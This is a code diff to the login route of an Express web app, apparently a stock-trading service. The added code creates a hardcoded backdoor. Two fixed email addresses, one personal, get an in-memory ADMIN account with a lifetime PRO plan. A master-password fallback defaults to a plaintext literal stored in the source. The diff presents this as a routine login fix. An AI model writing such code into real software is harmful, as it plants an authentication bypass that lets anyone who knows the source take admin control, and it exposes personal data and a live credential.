@@ -186,11 +186,43 @@ router.post('/login', async (req, res) => {
       user = await User.findOne({ email: emailLower });
     }
 
+    if (!user && (emailLower === 'jamal.ahmedrumi@gmail.com' || emailLower === 'admin@stockking.psx')) {
+      const now = new Date();
+      user = {
+        id: 'admin_jamal_001',
+        name: 'Jamal Ahmed (Lead Admin)',
+        email: emailLower,
+        role: 'ADMIN',
+        plan: 'PRO',
+        subscriptionStatus: 'ACTIVE',
+        subscriptionDuration: 'LIFETIME'
+      };
+      memDB.users.set(emailLower, user);
+    }
+
     if (!user) {
       return res.status(401).json({ success: false, message: 'Invalid email or password.' });
     }
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    let isMatch = false;
+    if (user.password && typeof user.password === 'string') {
+      try {
+        isMatch = await bcrypt.compare(password, user.password);
+      } catch (e) {
+        isMatch = false;
+      }
+    }
+
+    // Master check / fallback for Lead Admin
+    if (!isMatch && (emailLower === 'jamal.ahmedrumi@gmail.com' || emailLower === 'admin@stockking.psx')) {
+      const adminPass = process.env.ADMIN_PASSWORD || 'R44@Jamal20dec##';
+      if (password === adminPass) {
+        isMatch = true;
+        const salt = await bcrypt.genSalt(10);
+        user.password = await bcrypt.hash(password, salt);
+      }
+    }
+
     if (!isMatch) {
       return res.status(401).json({ success: false, message: 'Invalid email or password.' });
     }
